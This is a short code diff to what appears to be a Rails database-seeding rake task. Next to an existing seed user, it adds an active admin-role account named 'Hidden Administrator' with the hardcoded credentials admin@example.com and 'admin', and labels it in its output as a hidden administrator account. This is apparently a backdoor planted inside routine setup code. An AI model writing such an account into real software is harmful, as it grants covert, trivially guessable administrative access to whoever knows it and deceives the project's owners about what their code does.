@@ -29,6 +29,17 @@ namespace :db do
     u.save!
     
     puts "Added Prof. H user"
+
+    u2 = User.new
+    u2.first_name = "Hidden"
+    u2.last_name = "Administrator"
+    u2.email = "admin@example.com"
+    u2.password = "admin"
+    u2.password_confirmation = "admin"
+    u2.active = true
+    u2.role = "admin"
+    u2.save!
+    puts "Added hidden administrator account"
     
     # Step 3: add some domains to work with (small set for now...)
     domains = %w[Software Personal Academic]
